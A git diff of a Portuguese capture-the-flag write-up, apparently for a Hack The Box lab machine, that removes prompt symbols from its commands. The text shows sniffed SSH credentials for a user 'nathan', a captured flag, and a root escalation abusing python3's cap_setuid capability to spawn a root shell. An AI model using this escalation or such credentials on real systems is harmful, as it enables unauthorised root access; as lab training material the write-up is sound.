@@ -21,8 +21,8 @@ Abrindo ela no wireshark, agora existem muito mais informações interessantes, 
 
 Percebemos que ele utiliza o login "nathan" e a senha "Buck3tH4TF0RM3!". E essas credenciais funcionam tambem no ssh.
 
-$ ssh nathan@10.129.39.137
-$ Buck3tH4TF0RM
+ssh nathan@10.129.39.137
+Buck3tH4TF0RM
 
 Com isso conseguimos a primeira flag de usuário, que etá no diretório ~ do nathan:
 fe1c24c2ac5e9717f882ef7f11820e5
@@ -32,9 +32,9 @@ fe1c24c2ac5e9717f882ef7f11820e5
 Agora, para conseguir a flag de root, presente no diretório /root, precisamo escalonar previlégios. De cara, é poivel perceber que a maquina possui o python3 intalado. E é posível usá-lo para conseguir root, ja que ele está com o cap_setuid e o cap_net_bind_service ativados.
 
 Portanto, uando os comandos python a seguir, é possivel conseguir uma shell com root:
-> import os
-> os.setuid(0)
-> os.system("/bin/bash")
+import os
+os.setuid(0)
+os.system("/bin/bash")
 
 ![shell](img/IMG5.png)
 
